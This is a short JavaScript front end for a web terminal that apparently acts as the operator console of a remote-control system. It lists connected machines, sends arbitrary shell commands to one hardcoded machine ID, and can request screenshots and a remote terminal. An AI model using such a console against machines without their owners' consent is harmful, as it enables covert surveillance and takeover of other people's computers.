const socket = io('http://localhost:3000');
const input = document.getElementById('input');
const sendButton = document.getElementById('send');
const terminalOutput = document.getElementById('terminal-output');
let currentUser = "";

socket.emit("system:register", { type: "X-SENDER" ,hostname: null});

socket.on('system:computer-listing', (executorInfo) => {
    executorInfo.forEach(element => {
        addOutput(element)
    });
});


socket.on('term:error', (error) => {
    addOutput(error)
  });
  







function addOutput(text) {
    const li = document.createElement('li');
    li.textContent = text;
    terminalOutput.appendChild(li);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

function handleCommand(command) {
    addOutput(`${currentUser} $ ${command}`);
    if(command === 'list'){
        socket.emit('system:computer-listing', { type: "X-SENDER", command });
    }

    if(command === 'photo'){
        socket.emit('screen:take',{ id: "C02ZPQ76MD6M" })
    }

    if(command === 'open term'){
        socket.emit('open:term','C02ZPQ76MD6M')
    }
    socket.emit('exec:command', { type: "X-SENDER", command , id: "C02ZPQ76MD6M" });
}

socket.on('response', (result) => {
    addOutput(result);
});

sendButton.addEventListener('click', () => {
    const command = input.value.trim();
    if (command) {
        handleCommand(command);
        input.value = '';  // Effacer après envoi
    }
});

input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        sendButton.click();
    }
});
